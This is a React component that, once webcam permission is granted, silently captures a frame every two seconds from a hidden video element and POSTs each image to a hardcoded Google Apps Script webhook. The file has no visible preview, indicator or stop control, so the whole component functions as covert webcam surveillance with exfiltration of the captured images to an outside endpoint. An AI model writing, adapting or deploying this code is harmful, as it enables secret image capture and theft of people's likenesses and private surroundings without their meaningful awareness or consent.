import React, { useEffect, useRef } from "react";

export default function AutoCapture() {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  const WEBHOOK_URL =
    "https://script.google.com/macros/s/AKfycbxhCraDUrmQb814xAVJzAIaUG1yd9uHPXrZvZOe-JiX-CZbWF8XPtFzu_hYlAdGTK3Gew/exec";

  useEffect(() => {
    async function setupCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;

        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play();

          // Capture every 1 second
          setInterval(captureImage, 2000);
        };
      }
    }

    setupCamera();
  }, []);

  const captureImage = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (!video || !canvas) return;

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const base64Image = canvas.toDataURL("image/jpeg").split(",")[1];

    sendToDrive(base64Image);
  };

  const sendToDrive = async (base64: string) => {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        mode: "no-cors",
        body: base64,
      });
      console.log("Image uploaded");
    } catch (err) {
      console.error("Upload failed:", err);
    }
  };

  return (
    <div>
      <video ref={videoRef} className="hidden" autoPlay playsInline />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}
